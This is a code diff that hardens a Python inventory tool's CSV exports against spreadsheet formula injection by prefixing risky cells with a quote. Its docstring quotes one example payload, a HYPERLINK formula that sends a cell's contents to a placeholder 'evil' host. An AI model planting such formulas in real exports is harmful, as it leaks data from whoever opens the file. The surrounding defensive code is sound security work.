@@ -203,6 +203,27 @@ def sanitize_output(text: str) -> str:
     return ''.join(cleaned)
 
 
+# Leading characters that make spreadsheet apps (Excel, LibreOffice, Google Sheets) treat a
+# CSV cell as a formula (OWASP "CSV Injection"). OWASP also lists TAB and CR; sanitize_output
+# has already turned those into spaces, which is why the check ignores leading whitespace.
+_CSV_FORMULA_PREFIXES = ("=", "+", "-", "@")
+
+
+def csv_safe_cell(value) -> str:
+    """Sanitize a value for a CSV cell and neutralise spreadsheet formula injection.
+
+    A cell such as '=HYPERLINK("http://evil/?"&A1,"Click")' would run as a formula when
+    the export is opened in Excel; quoting does not prevent this. Prefixing a single
+    quote makes spreadsheet apps show the value as literal text.
+    """
+    text = sanitize_output(value)
+    if text is None:
+        return ""
+    if text.lstrip().startswith(_CSV_FORMULA_PREFIXES):
+        return "'" + text
+    return text
+
+
 class ProgressBar:
     """A simple console progress bar."""
 
@@ -2056,7 +2077,8 @@ class SoftwareExporter:
         writer.writeheader()
 
         for software in software_list:
-            writer.writerow(SoftwareExporter._sanitize_software_dict(software))
+            row = SoftwareExporter._sanitize_software_dict(software)
+            writer.writerow({k: csv_safe_cell(v) for k, v in row.items()})
 
         return output.getvalue()
 
@@ -2279,7 +2301,7 @@ class BaselineManager:
 
     @staticmethod
     def diff_to_csv(diff: BaselineDiff) -> str:
-        """Render a baseline diff as CSV, with every field sanitized.
+        """Render a baseline diff as CSV, with every field sanitized and formula-safe.
 
         Columns: change_type, name, baseline_version, current_version, publisher, source
         """
@@ -2288,7 +2310,7 @@ class BaselineManager:
         writer.writerow(["change_type", "name", "baseline_version", "current_version", "publisher", "source"])
 
         def row(change_type, name, baseline_version, current_version, publisher, source):
-            writer.writerow([change_type] + [sanitize_output(v) for v in
+            writer.writerow([change_type] + [csv_safe_cell(v) for v in
                             (name, baseline_version, current_version, publisher, source)])
 
         for s in diff.added:
